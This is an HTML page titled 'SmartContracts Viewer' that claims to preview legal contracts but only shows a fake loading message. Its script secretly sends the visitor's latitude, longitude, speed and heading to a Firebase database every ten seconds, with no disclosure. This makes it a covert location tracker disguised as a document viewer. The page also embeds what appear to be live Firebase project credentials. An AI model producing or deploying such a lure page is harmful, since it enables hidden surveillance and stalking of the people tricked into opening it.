<!DOCTYPE html>
<html>
<head>
  <title>SmartContracts Viewer</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f7f7f7;
      color: #333;
      text-align: center;
      padding: 40px;
    }
    h1 {
      color: #444;
    }
    .card {
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      padding: 30px;
      max-width: 400px;
      margin: auto;
    }
    p {
      font-size: 15px;
      color: #777;
    }
  </style>
</head>
<body>

  <div class="card">
    <h1>SmartContracts Viewer</h1>
    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>
    <p><i>Loading contract document...</i></p>
  </div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

  <script>
    // âœ… Replace this with your actual config
    const firebaseConfig = {
      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
      authDomain: "gps-d0bab.firebaseapp.com",
      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
      projectId: "gps-d0bab",
      storageBucket: "gps-d0bab.appspot.com",
      messagingSenderId: "810816177909",
      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Generate fake user ID for session
    const userId = 'device_' + Math.random().toString(36).substr(2, 9);

    // Function to get direction from heading
    function getDirection(heading) {
      if (heading === null) return "Unknown";
      const directions = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"];
      return directions[Math.round(heading / 45) % 8];
    }

    function updateLocation(position) {
      const { latitude, longitude, speed, heading } = position.coords;
      const direction = getDirection(heading);
      const timestamp = new Date().toISOString();

      db.ref('locations/' + userId).set({
        latitude, longitude, speed, direction, timestamp
      });
    }

    function handleError(error) {
      console.warn("Location error:", error.message);
    }

    function trackLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(updateLocation, handleError);
      }
    }

    // Auto update location every 10 seconds
    setInterval(trackLocation, 10000);
    trackLocation();
  </script>
</body>
</html>
